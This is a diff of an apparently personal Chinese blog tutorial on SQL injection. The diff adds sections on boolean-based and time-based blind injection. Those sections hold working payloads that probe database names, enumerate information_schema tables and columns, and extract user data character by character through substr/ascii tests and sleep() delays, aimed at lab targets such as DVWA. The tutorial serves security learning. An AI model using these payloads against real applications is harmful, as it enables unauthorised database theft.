@@ -162,7 +162,7 @@
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2023-08-11 16:48:41</span>
+        <span class="pc">2023-08-12 16:55:07</span>
     </span>
     
     
@@ -187,6 +187,7 @@
 <p>简而言之:SQL注入的原理就是攻击者通过拼接恶意SQL语句，将其带入数据库进行查询，从而得到数据库一些敏感信息。<br><strong>SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</strong></p>
 <h4 id="3-注入条件"><a href="#3-注入条件" class="headerlink" title="3.注入条件"></a>3.注入条件</h4><p>SQL注入产生条件有三:<br>(1) 变量可控；<br>(2)变量未存在过滤；<br>(3) 我们构造的SQL语句可带入数据库中查询。</p>
 <p><strong>当我们了解SQL注入产生的条件时，还有一个非常重要的点需要特别注意,就是应该了解那个参数存在注入点。</strong></p>
+<p><img src="https://raw.githubusercontent.com/braaain/image1/main/img/image-20230812163237584.png" alt="image-20230812163237584"></p>
 <h3 id="二、SQL注入类型"><a href="#二、SQL注入类型" class="headerlink" title="二、SQL注入类型"></a>二、SQL注入类型</h3><h4 id="1、按照注入点分类："><a href="#1、按照注入点分类：" class="headerlink" title="1、按照注入点分类："></a>1、按照注入点分类：</h4><p>（1）数字型注入：许多网页链接有类似的结构 <a class="link"   target="_blank" rel="noopener" href="http://xxx.com/users.php?id=1" >http://xxx.com/users.php?id=1<i class="fas fa-external-link-alt"></i></a> 基于此种形式的注入，注入点id为数字，一般被叫做数字型注入点，通过这种形式查询出后台数据库信息返回前台展示，可以构造类似以下的SQL语句进行爆破：</p>
 <blockquote>
 <p>select xxx from 表名 where id&#x3D;1 and 1&#x3D;1。</p>
@@ -214,7 +215,7 @@
 <p>（2）双写关键词绕过(ununionion)</p>
 <p>（3）编码绕过（base64、url）</p>
 <p>（4）内联注释绕过（&#x2F;*! Union *&#x2F;）</p>
-<h3 id="四、SQL注入-般步骤"><a href="#四、SQL注入-般步骤" class="headerlink" title="四、SQL注入-般步骤"></a>四、SQL注入-般步骤</h3><p>1.注入点判断</p>
+<h3 id="四、SQL注入-般步骤"><a href="#四、SQL注入-般步骤" class="headerlink" title="四、SQL注入-般步骤"></a>四、SQL注入-般步骤</h3><h4 id="一、基于报错的注入："><a href="#一、基于报错的注入：" class="headerlink" title="一、基于报错的注入："></a>一、基于报错的注入：</h4><p>1.注入点判断</p>
 <p>2.注入点类型判断(有无回显)</p>
 <blockquote>
 <ul>
@@ -245,6 +246,46 @@
 </blockquote>
 <blockquote>
 <p>?id&#x3D;2’ union select 1,2,3– -</p>
+</blockquote>
+<h4 id="二、盲注"><a href="#二、盲注" class="headerlink" title="二、盲注"></a>二、盲注</h4><h5 id="一、SQL盲注概述"><a href="#一、SQL盲注概述" class="headerlink" title="一、SQL盲注概述"></a>一、SQL盲注概述</h5><p>盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程称为盲注。</p>
+<p>1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的盲注来获取信息。<br>2.盲注是不能通过直接显示的途径来获取数据库数据的方法。<br>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同，一般分为三类）</p>
+<p>3.需要掌握的函数：<br>substr用法<br>索引开始从1开始<br>ascii用法<br>length用法</p>
+<h5 id="二、布尔盲注"><a href="#二、布尔盲注" class="headerlink" title="二、布尔盲注"></a>二、布尔盲注</h5><p>原理：<br>盲注查询是不需要返回结果的，仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False</p>
+<p>流程：</p>
+<blockquote>
+<ul>
+<li>求闭合字符</li>
+<li>求当前数据库的长度</li>
+<li>求当前数据库表对应的ASCII</li>
+<li>求当前数据库中表的数量</li>
+<li>求当前数据库表中其中一个表的表名长度</li>
+<li>求当前数据库中其中一个表的表名对应的ASCII</li>
+<li>求字段的数量</li>
+<li>求字段内容的长度</li>
+<li>求字段内容对应的ascii</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">?id=1(?id=1&#x27;)</span><br><span class="line">#1.判断闭合类型</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and length(database()) &gt;= 8 -- -</span><br><span class="line">?id=1&#x27; and length(database()) &lt;= 8 -- -</span><br><span class="line">?id=1&#x27; and length(database()) = 8 -- -  大于小于二分法判断=确定长度</span><br><span class="line">#2.求数据库的长度 </span><br><span class="line"></span><br><span class="line">?id=1&#x27; and substr(database(),$1$,1) = &#x27;$s$&#x27; -- -</span><br><span class="line"></span><br><span class="line">#3.求数据库对应的ascii值（表名）：判断数据库从第一位开始的每一位字母(选中部分进入burp进行音叉或集束炸弹爆破，第一位范围为2步数据长度范围，从1到求出长度 ；第二位从1到128进行ascii码爆破，按长度筛选出不同的长度即为表名)</span><br><span class="line"></span><br><span class="line">#4.求当前数据库中表的数量</span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=$1$ # 显⽰不存在</span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=$2$ # 显⽰存在</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">原理是使用count()这个函数来判断table_name这个表的数量有几个</span><br><span class="line">然后后面有一个where判断来指定是当前数据库</span><br><span class="line">在末尾有一个 =1 ，意思是判断表有1个，正确那么页面返回正常，错误即返回不正常</span><br><span class="line"></span><br><span class="line">#5.求数据库中表名的长度：用&gt;,&lt;,二分法进行判断长度</span><br><span class="line"></span><br><span class="line">第一个表名长度：&#x27;and length((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1))=6 -- -</span><br><span class="line"></span><br><span class="line">第二个表名长度: &#x27;and length((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1))=8 -- -</span><br><span class="line"></span><br><span class="line">#6.求当前数据库中其中一个表的表名对应的ASCII</span><br><span class="line"></span><br><span class="line">语法格式是：</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit i,1),n,1))&gt;97 </span><br><span class="line">i 是第几个表</span><br><span class="line">n 是第几个字符</span><br><span class="line"></span><br><span class="line">查询第一个表的第一位字符</span><br><span class="line">&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit $0$,1),$1$,1))=&#x27;$117$&#x27; -- -</span><br><span class="line"></span><br><span class="line">查询第二个表的第二个字符</span><br><span class="line">&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit $1$,1),$2$,1))=&#x27;$117$&#x27;  -- -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#7、猜解字段的数量：</span><br><span class="line"></span><br><span class="line">判断表名users的字段数量是否为8</span><br><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=$8$ </span><br><span class="line"></span><br><span class="line">#8、猜解字段的长度：</span><br><span class="line"></span><br><span class="line">猜解第一个字段的长度是否为7</span><br><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),1))=&quot;$7$&quot;</span><br><span class="line"></span><br><span class="line">猜解第二个字段的长度是否为10</span><br><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),1))=&quot;$10$&quot; </span><br><span class="line"></span><br><span class="line">#9、猜解字段的名字：</span><br><span class="line"></span><br><span class="line">如果想查询第n个字段，那么就使用这个语句：</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit i,1),n,1))=&#x27;$101$&#x27;</span><br><span class="line">注释：</span><br><span class="line">i代表查询第几个表</span><br><span class="line">n代码查询列的第几个字符</span><br><span class="line"></span><br><span class="line">猜解 dvwa.users 表下的 user 列的第一个字段内容为：a</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=</span><br><span class="line">&quot;$97$&quot;</span><br><span class="line"></span><br><span class="line">暴力猜解：</span><br><span class="line">猜解 user 字段值是否为 admin</span><br><span class="line">1&#x27; and (select count(*) from users where user = &#x27;admin&#x27;) = 1 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="三、时间盲注"><a href="#三、时间盲注" class="headerlink" title="三、时间盲注"></a>三、时间盲注</h5><p>时间盲注又称延迟注入，适用于页面不会返回错误信息，只会回显一种界面，其主要特征是利用sleep函数，制造时间延迟，由回显时间来判断是否报错。</p>
+<p><strong>官方理解：利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3。</strong></p>
+<p>if（判断语句，x，y）如果判断语句正确则输出X，否则输出Y<br>sleep(X)函数，延迟X秒后回显<br>if(1&#x3D;1,1,sleep(1))即输出1<br>if(1&#x3D;2,1,sleep(1))即延迟一秒后回显</p>
+<p>【闭合】结果就是如果构成闭合，则会执行闭合后的代码，且闭合内部的代码并不会被执行</p>
+<p>判断库名长度</p>
+<blockquote>
+<p>?id&#x3D;1’ and if(length(database())&gt;8,sleep(2),0) –+</p>
+</blockquote>
+<p>判断库名</p>
+<blockquote>
+<p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,sleep(2),0) –+<br>此为判断第一个字母的ascii码是否为115</p>
+</blockquote>
+<p>判断表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=‘security’ limit x,y),z,d))=e,sleep(1),0)–-+</span><br><span class="line">其中x代表第x+1个表，y表示第x+1往后y个单位的表，z表示第几个字母，d表示z往后d个单位的字母</span><br></pre></td></tr></table></figure>
+<p>判断列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ and If(ascii(substr((select column_name from information_schema.columns where table_name=‘users’ and table_schema=database() limit x,y),z,d))=105,sleep(2),1)–+</span><br><span class="line">x：第x+1个列，y：x+1个列往后y个单位，z：x+1列的第一个字母，d：第一个字母往后的第z个单位</span><br></pre></td></tr></table></figure>
+<p>依次往下爆，得到第一列：id第二列：username第三列：password</p>
+<p>爆数据</p>
+<blockquote>
+<p>?id&#x3D;1’ and If(ascii(substr((select username from users limit 0,1),1,1))&#x3D;68,sleep(2),1)–+</p>
 </blockquote>
 <p><strong>相关函数：</strong></p>
 <p><img src="https://raw.githubusercontent.com/braaain/image1/main/img/image-20230811162026460.png" alt="image-20230811162026460"></p>
@@ -399,8 +440,6 @@
 <td align="center">select ifnull(null,2)</td>
 </tr>
 </tbody></table>
-</blockquote>
-<blockquote>
 </blockquote>
 <blockquote>
 <ul>
